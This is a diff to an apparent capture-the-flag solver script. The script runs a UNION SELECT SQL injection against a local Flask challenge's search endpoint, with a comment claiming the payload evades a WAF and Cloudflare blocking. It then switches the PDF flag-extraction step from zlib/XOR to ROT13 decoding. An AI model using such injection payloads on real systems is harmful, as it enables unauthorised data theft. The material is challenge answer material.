@@ -1,7 +1,7 @@
 import os
 import re
 import sys
-import zlib
+import codecs
 
 # Add challenge directory to Python path to use Flask test client
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'challenge')))
@@ -12,7 +12,7 @@ def solve():
     init_db()
     client = app.test_client()
     
-    print("[+] Step 2: Exploiting Web Search via SQL Injection...")
+    print("[+] Step 2: Exploiting Web Search via Medium-Hard SQL Injection...")
     # Using Medium-Hard UNION SELECT bypass payload (avoids WAF blacklist and Cloudflare 403)
     sqli_payload = "%' UNION SELECT title, access_level, file_path, author FROM documents WHERE access_level LIKE '%"
     res = client.post("/search", data={'q': sqli_payload})
@@ -56,7 +56,7 @@ def solve():
     osint_key = f"{project_match.group(1)}-{target_empid}"
     print(f"[+] Correctly assembled OSINT passphrase / key: {osint_key}")
     
-    print("[+] Step 4: Inspecting & Extracting Hidden FlateDecode Stream from PDF...")
+    print("[+] Step 4: Inspecting PDF Metadata & Solving Riddle...")
     pdf_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'challenge', 'static', 'confidential_memo.pdf'))
     if not os.path.exists(pdf_path):
         print(f"[-] PDF file not found at {pdf_path}")
@@ -65,26 +65,18 @@ def solve():
     with open(pdf_path, 'rb') as f:
         pdf_bytes = f.read()
         
-    # Search for Object 7 stream content compressed with FlateDecode
-    stream_match = re.search(rb"7 0 obj\s*<<[^>]+>>\s*stream\n(.*?)\nendstream", pdf_bytes, re.DOTALL)
-    if not stream_match:
-        print("[-] Hidden Stream Object 7 not found in PDF structure!")
+    # Search for ROT13 Cipher inside Document Properties Subject field
+    cipher_match = re.search(rb"ROT13 Cipher:\s*([a-zA-Z0-9_{}-]+)", pdf_bytes)
+    if not cipher_match:
+        print("[-] ROT13 Cipher not found in PDF metadata properties!")
         return False
         
-    compressed_payload = stream_match.group(1)
-    try:
-        encrypted_bytes = zlib.decompress(compressed_payload)
-        print(f"[+] Successfully decompressed zlib payload ({len(encrypted_bytes)} bytes)")
-    except Exception as e:
-        print(f"[-] Zlib decompression failed: {e}")
-        return False
+    rot13_cipher = cipher_match.group(1).decode('ascii')
+    print(f"[+] Found ROT13 Encrypted Cipher in Subject: {rot13_cipher}")
     
-    print("[+] Step 5: Decrypting payload with OSINT XOR Key...")
-    key_bytes = osint_key.encode('ascii')
-    decrypted = bytes([encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(encrypted_bytes))])
-    
-    flag_str = decrypted.decode('ascii', errors='ignore')
-    print(f"[+] Decrypted stream content: {flag_str}")
+    print("[+] Step 5: Decrypting ROT13 Cipher ('thirteen steps around')...")
+    flag_str = codecs.decode(rot13_cipher, 'rot_13')
+    print(f"[+] Decrypted string content: {flag_str}")
     
     if "rvcectf{" in flag_str and "f4k3" not in flag_str and "tr4p" not in flag_str:
         print(f"\n[*] CHALLENGE VERIFIED SOLVED! True Flag retrieved: {flag_str}")
